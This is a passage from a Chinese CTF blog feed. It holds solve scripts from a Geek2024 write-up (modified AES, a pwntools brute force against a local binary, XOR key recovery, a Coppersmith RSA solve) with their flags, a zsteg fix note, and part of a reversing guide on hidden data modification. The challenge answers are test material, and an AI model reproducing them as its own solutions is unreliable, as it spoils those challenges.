class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span><br>]<br><br>new_s_box = [<span class="hljs-number">0x7C</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>,<br>  <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>,<br>  <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>,<br>  <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>,<br>  <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>,<br>  <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>,<br>  <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>,<br>  <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,<br>  <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>,<br>  <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>,<br>  <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>,<br>  <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xCD</span>,<br>  <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>,<br>  <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>,<br>  <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,<br>  <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>,<br>  <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>,<br>  <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>,<br>  <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>,<br>  <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>,<br>  <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>,<br>  <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>,<br>  <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x8C</span>,<br>  <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>,<br>  <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x87</span>]<br><br>new_contrary_sbox = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    line = (new_s_box[i] &amp; <span class="hljs-number">0xf0</span>) &gt;&gt; <span class="hljs-number">4</span><br><br>    rol = new_s_box[i] &amp; <span class="hljs-number">0xf</span><br><br>    new_contrary_sbox[(line * <span class="hljs-number">16</span>) + rol] = i<br><br><br>IInput = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;99E8B801C882519312EE8964E7EF638D&#x27;</span>)<br>Cipher_Key = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">b&#x27;SYCLOVERSYCLOVER&#x27;</span>)<br>Out = IAES().IAES(IInput, Cipher_Key,new_contrary_sbox)<br><span class="hljs-built_in">print</span>(Out)<br><span class="hljs-comment">#b&#x27;SYC&#123;B3l1eue_Th@t&#x27;</span><br>IInput = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;51DF5D7839AA3962A0B4503047302106&#x27;</span>)<br>Cipher_Key = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">b&#x27;SYCLOVERSYCLOVER&#x27;</span>)<br>Out = IAES().IAES(IInput, Cipher_Key,new_contrary_sbox)<br><span class="hljs-built_in">print</span>(Out)<br><span class="hljs-comment">#b&#x27;_y0u__l3aRn_Aes&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="blasting-master"><a href="#blasting-master" class="headerlink" title="blasting_master"></a>blasting_master</h2><p>四个字母一组去爆破，一次往后移一位，总共40次循环</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731743209276-968d8e02-16af-447d-9ef1-ca6e8b07e0f6.png" class="" title="img"><p>EVP加密后生成密文，暂且不管</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731743238360-6c8125da-3c4d-476e-9bb9-60220dc7673e.png" class="" title="img"><p>想着是patch然后一次加密一次判断，但是没有合适的指令可以修改，于是想到修改特定的比较长度，然后一位位爆破</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731755837095-34e01191-dfa3-4190-881f-6ace53636203.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> ascii_letters, digits<br><br>filename=<span class="hljs-string">&#x27;./main&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;</span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)<br>    attach(io,bk)<br><br>s2=<span class="hljs-string">&#x27;SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt!&#x27;</span><br>s1=<span class="hljs-string">&#x27;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM!@#$^+=%&amp;*()_-&#123;&#125;~/.&#x27;</span><br>i=<span class="hljs-number">0</span><br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br> <span class="hljs-keyword">try</span>:<br>    io=process(filename)<br>    s=s2<br>    s+=s1[j]<br>    sl(s.encode())<br>    recv0=io.recvline()<br>    recv1=io.recvline()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Congratulations!&quot;</span> <span class="hljs-keyword">in</span> recv1:<br>    s2+=s1[j]<br>    <span class="hljs-built_in">print</span>(s2)<br>    i+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">break</span><br>    j+=<span class="hljs-number">1</span><br>    io.close()<br> <span class="hljs-keyword">except</span> EOFError:<br>    io.close()<br>    <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>按这个思路走不到底，爆到3r跑不下去了，遇到0就会报错</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731756305965-f61088d9-fcc3-472e-a931-48c7ee06c4fb.png" class="" title="img"><p>一开始以为是0，走下去发现后面爆不出来了，尝试把0删去</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731755819107-a4cb6054-cc04-4cc8-a9ef-11407cff77cf.png" class="" title="img"><p>发现又在t卡住了，往下走能走通</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731756394599-fa2e3a6e-7df4-4d2a-81aa-0793b879bc84.png" class="" title="img"><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">SYC&#123;W0w!y0u_@re_th3_BeSt_blasting_Exp3rt!!&#125;<br></code></pre></td></tr></table></figure><h2 id="you-do-what"><a href="#you-do-what" class="headerlink" title="you_do_what"></a>you_do_what</h2><p>v17-&gt;v4-&gt;v25+2</p><p>后面发现v25+2好像和输入还有关系</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731897298977-d1e0f639-82d9-4a74-9e21-7558233f15d1.png" class="" title="img"><p>input进去之后直接是异或，又因为文件是gif，考虑根据文件头推出前几位异或的字符，发现是qwerty</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731900256443-c6ba3bee-76ab-4018-a099-812cc0b5869f.png" class="" title="img"><p>加上input是16的倍数</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731900369217-b91309ea-9009-477a-829e-1574626fdc77.png" class="" title="img"><p>那就猜一下key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;E:\\CTF_Attachments\\Geek\\2024\Re\\you_do_what\\Dusk_witnesses_devout_believers.gif&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>data=<span class="hljs-built_in">bytearray</span>(data)<br>key=<span class="hljs-built_in">list</span>(<span class="hljs-string">b&#x27;qwertyuiopasdfgh&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data) - <span class="hljs-number">1</span>):   <br>    data[i] = data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.gif&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br></code></pre></td></tr></table></figure><p>发现是对的</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731900099293-a7eaf023-256c-4f24-8ab1-541f8354fc20.png" class="" title="img"><p>v26和v25+2最后还是不相等，逆不明白，暂时就先这样</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>m高位泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span><br>c = <span class="hljs-number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span><br>h = <span class="hljs-number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span><br>e = <span class="hljs-number">3</span><br><span class="hljs-comment"># m=(h+2023)//2024</span><br><span class="hljs-comment"># print(m)</span><br>m1=<span class="hljs-number">55098146333703730947926790790691720107068601034889480665048328600442527334253415639480889244019378785454550164687091675430912</span><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = (m1 + x)^e - c<br>res = f.small_roots(X = <span class="hljs-number">2</span>^<span class="hljs-number">150</span>,beta = <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> res != []:<br>m = m1 + res[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br><span class="hljs-comment">#SYC&#123;crypto_is_very_interesting_why_dont_you_join_us&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tea魔改</tag>
      
      <tag>aes魔改</tag>
      
      <tag>整数溢出</tag>
      
      <tag>md5加密</tag>
      
      <tag>sm4加密</tag>
      
      <tag>hashcat爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zsteg异常之栈级别太深</title>
    <link href="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/"/>
    <url>/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/</url>
    
    <content type="html"><![CDATA[<p>2023.10.17</p><p>暑假也遇到过，之前重装了一下zsteg就解决了，现在再整理一下</p><p>据说是递归的原因</p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697546820671-5d9ee7d3-5c48-4fb4-9acf-99593dfb2b59.png" class="" title="img"><p>在网上找到这个</p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697547157743-a13d79eb-2cfe-4b3c-93cd-d0f9f51c68dc.jpeg" class="" title="img"><p>要去zshrc添加语句</p><p>先找到zshrc</p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697547289945-a5e8049f-88d1-43ce-972a-fa0b38923fc4.png" class="" title="img"><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697546976703-6d326e0f-fe98-4d34-b9b2-476e1bb736e6.png" class="" title="img"><p>然后添加上去</p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697547055836-01967642-2864-4aa3-90cc-5e6157f3eddb.png" class="" title="img"><p>最后就又可以用啦</p><img src="/2024/11/16/zsteg%E5%BC%82%E5%B8%B8%E4%B9%8B%E6%A0%88%E7%BA%A7%E5%88%AB%E5%A4%AA%E6%B7%B1/1697547471571-d31b35be-4931-4903-b538-d02314c1cf17.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数据修改总结</title>
    <link href="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/"/>
    <url>/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>一般来说，比赛中逆向方向的题目如果按照静态的数据解不出来，且认为者程序逻辑分析没有什么的话，有可能动态运行程序的时候数据有修改，下面是几种常见的修改数据的地方</p><h1 id="交叉引用"><a href="#交叉引用" class="headerlink" title="交叉引用"></a>交叉引用</h1><p>一般数据的修改都可以直接交叉引用ctrl+x或者x找到另外引用该内存的地方，出现的频率也最高</p><h2 id="2025数字中国数字安全赛道初赛数字安全-隐私保护"><a href="#2025数字中国数字安全赛道初赛数字安全-隐私保护" class="headerlink" title="2025数字中国数字安全赛道初赛数字安全-隐私保护"></a>2025数字中国数字安全赛道初赛数字安全-隐私保护</h2><p>unk_50c0变量在main里面没有赋初值但是后续异或会用到</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1744270058716-53d6fb1c-630f-40e0-887e-52781456f690.png" class="" title="img"><p>鼠标点在变量上在按x就能发现其他函数也调用这个变量</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1744270315043-78935ad0-9202-43a5-89e1-7c50fb8b064c.png" class="" title="img"><p>发现对byte50c0变量（unk_50c0本质上只是不知道类型而已）有赋值</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1744270338650-022f4e91-b19a-466f-ba33-a3b02a873e0c.png" class="" title="img"><h1 id="init-array"><a href="#init-array" class="headerlink" title="init_array"></a>init_array</h1><h2 id="2023浙江省省赛决赛re3"><a href="#2023浙江省省赛决赛re3" class="headerlink" title="2023浙江省省赛决赛re3"></a>2023浙江省省赛决赛re3</h2><p>ctrl+s查看数据段，发现init_array有函数</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1723080514139-5a122714-ef72-42e2-a28d-8602220cc855-17442716923914.png" class="" title="img"><p>函数点进去后发现有修改，前面一部分相当于特征码搜索，找到i+31的地方改为75</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1723221982668-6fb06871-e612-49aa-8938-b6711997f2ee-17442716923916.png" class="" title="img"><p>大概率是在tea算法中有修改，因为看汇编有一段很奇怪的指令，也就是4个nop</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1723222235101-b3905bf7-866e-428d-9d03-984d46d1277e-17442716923918.png" class="" title="img"><p>原来的0b改为4b，从add变成sub，那大概率是对的</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1723224496274-7a060096-a6e2-47ad-b032-72f26dc002ee-174427169239110.png" class="" title="img"><h1 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h1><h2 id="2023NewStarCTFweek3EzDll"><a href="#2023NewStarCTFweek3EzDll" class="headerlink" title="2023NewStarCTFweek3EzDll"></a>2023NewStarCTFweek3EzDll</h2><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1730010227548-177c274a-f88b-405c-9464-881c19dd2604-174427169239112.png" class="" title="img"><p>函数列表最开始可能会出现tls_callback函数，先于main执行，main运行结束又回到tls，一般tls会和花指令等结合，在函数列表也能搜到</p><p>同时注意有反调试，正常都是不调试才能获得正确密文，所以这里第一个key是5而不是6</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1722600582598-fa60272c-057a-4d35-ae38-2d57674c7ba0-174427169239114.png" class="" title="img"><h1 id="init-function"><a href="#init-function" class="headerlink" title="init_function"></a>init_function</h1><h2 id="2023NewStarCTFweek4iwannarest"><a href="#2023NewStarCTFweek4iwannarest" class="headerlink" title="2023NewStarCTFweek4iwannarest"></a>2023NewStarCTFweek4iwannarest</h2><p>key在init_function被修改</p><img src="/2024/11/14/%E6%95%B0%E6%8D%AE%E4%BF%AE%E6%94%B9%E6%80%BB%E7%BB%93/1722854773547-8b3d27b9-d596-41cd-99e3-fd1ea2d2289f-174427169239116.png" class="" title="img"><p>xxtea解密的key被重新赋值了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 